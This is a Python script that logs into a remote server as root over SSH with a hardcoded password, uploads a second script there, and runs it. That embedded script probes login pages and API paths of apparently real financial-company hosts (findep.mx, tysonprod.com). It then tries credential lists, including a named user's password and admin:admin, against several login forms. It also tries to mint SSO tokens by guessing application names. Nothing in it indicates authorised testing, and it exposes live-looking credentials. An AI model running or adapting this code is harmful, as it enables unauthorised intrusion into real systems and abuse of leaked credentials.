import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

URLS = [
    "https://ppp.findep.mx/khorLogin.asp",
    "https://sif.findep.mx/#/login",
    "https://sif.findep.mx/",
    "https://pao.findep.com.mx/MRcgi/MRentrancePage.pl",
    "https://findep-hawking.tysonprod.com/",
    "https://pao.findep.com.mx/MRcgi/MRlogin.pl",
    "https://pao.findep.com.mx/MRcgi/MRsignUp.pl",
    "https://findep.tysonbeta.com/",
    "https://wiki.findep.mx/login",
]

# ========================================
# 1. PROBE EACH URL
# ========================================
sys.stdout.write("=" * 70 + "\n=== PROBING ALL URLS ===\n" + "=" * 70 + "\n\n")

for url in URLS:
    sys.stdout.write(f"\n{'='*60}\n>>> {url}\n{'='*60}\n")
    try:
        r = s.get(url, timeout=15, allow_redirects=False)
        sys.stdout.write(f"  [{r.status_code}] {len(r.text)}b\n")
        sys.stdout.write(f"  Server: {r.headers.get('Server','?')}\n")
        sys.stdout.write(f"  Content-Type: {r.headers.get('Content-Type','?')}\n")
        sys.stdout.write(f"  Location: {r.headers.get('Location','')}\n")
        
        # Key headers
        for h in ['X-Powered-By', 'Set-Cookie', 'WWW-Authenticate', 'X-Frame-Options',
                   'X-AspNet-Version', 'X-AspNetMvc-Version', 'X-Request-Id']:
            if h in r.headers:
                val = r.headers[h]
                if len(val) > 200: val = val[:200] + "..."
                sys.stdout.write(f"  {h}: {val}\n")
        
        # Cookies
        for c in r.cookies:
            sys.stdout.write(f"  Cookie: {c.name}={c.value[:60]}{'...' if len(c.value)>60 else ''} domain={c.domain}\n")
        
        # Follow redirects manually
        if r.status_code in [301, 302, 303, 307]:
            loc = r.headers.get('Location', '')
            if loc:
                try:
                    r2 = s.get(loc if loc.startswith('http') else url.rsplit('/', 1)[0] + '/' + loc,
                              timeout=10, allow_redirects=True)
                    sys.stdout.write(f"  -> Followed to [{r2.status_code}] {len(r2.text)}b {r2.url[:100]}\n")
                    r = r2
                except Exception as e:
                    sys.stdout.write(f"  -> Follow ERR: {e}\n")
        
        # Body analysis
        body = r.text[:8000]
        title = re.search(r'<title[^>]*>(.*?)</title>', body, re.S|re.I)
        if title:
            sys.stdout.write(f"  Title: {title.group(1).strip()[:100]}\n")
        
        # Forms
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*(?:method=["\']([^"\']*)["\'])?', body, re.I)
        for action, method in forms:
            sys.stdout.write(f"  Form: {method.upper() or 'GET'} -> {action[:100]}\n")
        
        # Inputs
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?(?:[^>]+value=["\']([^"\']*)["\'])?', body, re.I)
        for name, typ, val in inputs[:15]:
            sys.stdout.write(f"  Input: name={name} type={typ or '?'} val={val[:50] if val else ''}\n")
        
        # Links and JS refs
        scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.I)
        for sc in scripts[:5]:
            sys.stdout.write(f"  Script: {sc[:100]}\n")
        
        # Look for API/endpoint hints
        api_hints = re.findall(r'(?:api|endpoint|baseUrl|apiUrl|serviceUrl)["\s:=]+["\']?(https?://[^\s"\'<]+)', body, re.I)
        for hint in api_hints[:5]:
            sys.stdout.write(f"  API Hint: {hint}\n")
        
        # Technology indicators
        if 'asp' in url.lower() or 'ASP' in r.headers.get('X-Powered-By', ''):
            sys.stdout.write(f"  TECH: Classic ASP / IIS\n")
        if '.pl' in url:
            sys.stdout.write(f"  TECH: Perl CGI\n")
        if 'angular' in body.lower() or 'ng-app' in body.lower() or '<app-root' in body:
            sys.stdout.write(f"  TECH: Angular SPA\n")
        if 'vue' in body.lower() or '__vue__' in body:
            sys.stdout.write(f"  TECH: Vue.js\n")
        if 'react' in body.lower() or 'reactDOM' in body:
            sys.stdout.write(f"  TECH: React\n")
        
        # Dump first 2000 chars of interesting pages
        if r.status_code == 200 and len(r.text) > 100:
            sys.stdout.write(f"\n  --- BODY PREVIEW (first 2000) ---\n")
            sys.stdout.write(f"  {body[:2000]}\n")
            sys.stdout.write(f"  --- END PREVIEW ---\n")
        
    except requests.exceptions.ConnectTimeout:
        sys.stdout.write(f"  CONNECT_TIMEOUT\n")
    except requests.exceptions.ReadTimeout:
        sys.stdout.write(f"  READ_TIMEOUT\n")
    except requests.exceptions.ConnectionError as e:
        sys.stdout.write(f"  CONNECTION_ERROR: {str(e)[:150]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR: {str(e)[:150]}\n")
    sys.stdout.flush()


# ========================================
# 2. DNS RESOLUTION
# ========================================
sys.stdout.write("\n\n" + "=" * 70 + "\n=== DNS RESOLUTION ===\n" + "=" * 70 + "\n\n")

import socket
hosts = ["ppp.findep.mx", "sif.findep.mx", "pao.findep.com.mx",
         "findep-hawking.tysonprod.com", "findep.tysonbeta.com", "wiki.findep.mx"]

for h in hosts:
    try:
        ips = socket.getaddrinfo(h, 443, socket.AF_INET)
        unique = set(x[4][0] for x in ips)
        sys.stdout.write(f"  {h} -> {', '.join(unique)}\n")
    except Exception as e:
        sys.stdout.write(f"  {h} -> NXDOMAIN / ERR: {e}\n")
    sys.stdout.flush()


# ========================================
# 3. TRY LOGIN WHERE POSSIBLE
# ========================================
sys.stdout.write("\n\n" + "=" * 70 + "\n=== LOGIN ATTEMPTS ===\n" + "=" * 70 + "\n\n")

CREDS = [
    ("jcruzval", "Fisa1234*"),
    ("jcruzval", "jcruzval"),
    ("admin", "admin"),
    ("admin", "Fisa1234*"),
]

# --- PPP (Classic ASP) ---
sys.stdout.write("=== PPP.FINDEP.MX (ASP Login) ===\n")
for user, pwd in CREDS:
    try:
        # First GET the login page for any tokens
        r0 = s.get("https://ppp.findep.mx/khorLogin.asp", timeout=10)
        hidden = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', r0.text, re.I)
        data = {n: v for n, v in hidden}
        
        # Find form action
        form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', r0.text, re.I)
        action = form_action.group(1) if form_action else "khorLogin.asp"
        
        # Find input names for user/pass
        user_field = "usuario"
        pass_field = "password"
        for inp_name, inp_type, _ in re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?(?:[^>]+value=["\']([^"\']*)["\'])?', r0.text, re.I):
            if inp_type and inp_type.lower() == 'password':
                pass_field = inp_name
            elif 'user' in inp_name.lower() or 'login' in inp_name.lower() or 'usr' in inp_name.lower():
                user_field = inp_name
        
        data[user_field] = user
        data[pass_field] = pwd
        
        action_url = f"https://ppp.findep.mx/{action}" if not action.startswith('http') else action
        r = s.post(action_url, data=data, timeout=10, allow_redirects=False)
        
        tag = ""
        if r.status_code in [301, 302, 303] and 'login' not in r.headers.get('Location', '').lower():
            tag = " *** POSSIBLE SUCCESS ***"
        if r.status_code == 200 and ('bienvenido' in r.text.lower() or 'dashboard' in r.text.lower() or 'inicio' in r.text.lower()):
            tag = " *** SUCCESS ***"
        if 'incorrecto' in r.text.lower() or 'invalid' in r.text.lower() or 'error' in r.text.lower():
            tag = " (wrong creds)"
        
        sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {len(r.text)}b Loc={r.headers.get('Location','')[:80]}{tag}\n")
    except Exception as e:
        sys.stdout.write(f"  {user}:{pwd} -> ERR: {str(e)[:80]}\n")
    sys.stdout.flush()

# --- WIKI (likely Confluence/MediaWiki) ---
sys.stdout.write("\n=== WIKI.FINDEP.MX ===\n")
for user, pwd in CREDS:
    try:
        r0 = s.get("https://wiki.findep.mx/login", timeout=10)
        
        # Try standard login POST
        hidden = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', r0.text, re.I)
        data = {n: v for n, v in hidden}
        
        # Find user/pass fields
        for inp_name, inp_type, _ in re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?(?:[^>]+value=["\']([^"\']*)["\'])?', r0.text, re.I):
            if inp_type and inp_type.lower() == 'password':
                data[inp_name] = pwd
            elif 'user' in inp_name.lower() or 'login' in inp_name.lower() or 'name' in inp_name.lower():
                data[inp_name] = user
        
        if not data:
            data = {"username": user, "password": pwd}
        
        form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', r0.text, re.I)
        action_url = form_action.group(1) if form_action else "https://wiki.findep.mx/login"
        if not action_url.startswith('http'):
            action_url = "https://wiki.findep.mx" + (action_url if action_url.startswith('/') else '/' + action_url)
        
        r = s.post(action_url, data=data, timeout=10, allow_redirects=False)
        tag = ""
        if r.status_code in [301, 302] and 'login' not in r.headers.get('Location', '').lower():
            tag = " *** POSSIBLE SUCCESS ***"
        sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {len(r.text)}b Loc={r.headers.get('Location','')[:80]}{tag}\n")
    except Exception as e:
        sys.stdout.write(f"  {user}:{pwd} -> ERR: {str(e)[:80]}\n")
    sys.stdout.flush()

# --- SIF (SPA - check if API login) ---
sys.stdout.write("\n=== SIF.FINDEP.MX (SPA) ===\n")
try:
    r = s.get("https://sif.findep.mx/", timeout=10)
    sys.stdout.write(f"  Base: [{r.status_code}] {len(r.text)}b\n")
    
    # Look for API endpoints in the SPA bundle
    api_urls = re.findall(r'https?://[^\s"\'<>]+(?:api|auth|login|token)[^\s"\'<>]*', r.text, re.I)
    for u in set(api_urls)[:10]:
        sys.stdout.write(f"  API in SPA: {u[:120]}\n")
    
    # Try common API login paths
    api_paths = [
        "/api/login", "/api/auth/login", "/api/v1/auth", "/auth/login",
        "/api/authenticate", "/api/auth/token",
    ]
    for p in api_paths:
        try:
            r2 = s.post(f"https://sif.findep.mx{p}",
                json={"username": "jcruzval", "password": "Fisa1234*"},
                timeout=5, allow_redirects=False)
            if r2.status_code != 404:
                sys.stdout.write(f"  POST {p}: [{r2.status_code}] {r2.text[:300]}\n")
        except:
            pass
        sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")

# --- HAWKING (tysonprod) ---
sys.stdout.write("\n=== FINDEP-HAWKING.TYSONPROD.COM ===\n")
try:
    r = s.get("https://findep-hawking.tysonprod.com/", timeout=10, allow_redirects=True)
    sys.stdout.write(f"  [{r.status_code}] {len(r.text)}b Final URL: {r.url[:100]}\n")
    
    # Check common paths
    for p in ["/login", "/api", "/actuator", "/actuator/health", "/actuator/env",
              "/swagger-ui.html", "/swagger-ui/", "/v2/api-docs", "/health",
              "/api/v1/auth", "/api/auth/login"]:
        try:
            r2 = s.get(f"https://findep-hawking.tysonprod.com{p}", timeout=5, allow_redirects=False)
            if r2.status_code != 404:
                sys.stdout.write(f"  [{r2.status_code}] {p} ({len(r2.text)}b) {r2.text[:200]}\n")
        except:
            pass
        sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")

# --- TYSONBETA ---
sys.stdout.write("\n=== FINDEP.TYSONBETA.COM ===\n")
try:
    r = s.get("https://findep.tysonbeta.com/", timeout=10, allow_redirects=True)
    sys.stdout.write(f"  [{r.status_code}] {len(r.text)}b Final URL: {r.url[:100]}\n")
    
    for p in ["/login", "/api", "/actuator", "/actuator/health", "/health",
              "/swagger-ui.html", "/swagger-ui/", "/v2/api-docs"]:
        try:
            r2 = s.get(f"https://findep.tysonbeta.com{p}", timeout=5, allow_redirects=False)
            if r2.status_code != 404:
                sys.stdout.write(f"  [{r2.status_code}] {p} ({len(r2.text)}b) {r2.text[:200]}\n")
        except:
            pass
        sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")

# --- PAO (Perl CGI - FootPrints) ---
sys.stdout.write("\n=== PAO.FINDEP.COM.MX (FootPrints) ===\n")
for user, pwd in CREDS:
    try:
        r0 = s.get("https://pao.findep.com.mx/MRcgi/MRlogin.pl", timeout=10)
        hidden = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', r0.text, re.I)
        data = {n: v for n, v in hidden}
        
        for inp_name, inp_type, _ in re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?(?:[^>]+value=["\']([^"\']*)["\'])?', r0.text, re.I):
            if inp_type and inp_type.lower() == 'password':
                data[inp_name] = pwd
            elif 'user' in inp_name.lower() or 'login' in inp_name.lower() or 'name' in inp_name.lower():
                data[inp_name] = user
        
        if not any('user' in k.lower() for k in data):
            data['USER'] = user
            data['PASSWORD'] = pwd
        
        r = s.post("https://pao.findep.com.mx/MRcgi/MRlogin.pl", data=data, timeout=10, allow_redirects=False)
        tag = ""
        if r.status_code in [301, 302] and 'login' not in r.headers.get('Location', '').lower():
            tag = " *** POSSIBLE SUCCESS ***"
        sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {len(r.text)}b Loc={r.headers.get('Location','')[:80]}{tag}\n")
        if r.status_code == 200:
            sys.stdout.write(f"    Body: {r.text[:300]}\n")
    except Exception as e:
        sys.stdout.write(f"  {user}:{pwd} -> ERR: {str(e)[:80]}\n")
    sys.stdout.flush()


# ========================================
# 4. SSO TOKEN vs HAWKING
# ========================================
sys.stdout.write("\n\n" + "=" * 70 + "\n=== SSO TOKEN vs HAWKING ===\n" + "=" * 70 + "\n\n")
try:
    r = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
        json={"appJwt": "FINDEP-HAWKING", "serviceName": "catalogs-service"}, timeout=10)
    sys.stdout.write(f"Mint FINDEP-HAWKING: [{r.status_code}] {r.text[:300]}\n")
    if r.status_code == 200:
        tok = r.json().get("token", "")
        if tok:
            # Try hawking with token
            for p in ["/", "/api", "/api/v1", "/v1", "/actuator/health"]:
                try:
                    r2 = s.get(f"https://findep-hawking.tysonprod.com{p}",
                        headers={"Authorization": f"Bearer {tok}"}, timeout=5)
                    sys.stdout.write(f"  [{r2.status_code}] {p} ({len(r2.text)}b) {r2.text[:200]}\n")
                except:
                    pass
    
    # Try more appJwt names
    for app in ["FINDEP-HAWKING", "HAWKING", "FINDEP-MOBILE", "FINDEP-WEB", "FINDEP-SIF",
                "TYSON-SIF", "SIF", "PPP", "TYSON-PPP", "WIKI", "PAO"]:
        for svc in ["hawking-service", "sif-service", "ppp-service", "wiki-service"]:
            try:
                r = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
                    json={"appJwt": app, "serviceName": svc}, timeout=5)
                if r.status_code == 200 and "token" in r.text:
                    sys.stdout.write(f"  MINTED! app={app} svc={svc}\n")
                    sys.stdout.write(f"    {r.text[:200]}\n")
            except:
                pass
        sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"ERR: {e}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/probe_urls.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/probe_urls.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
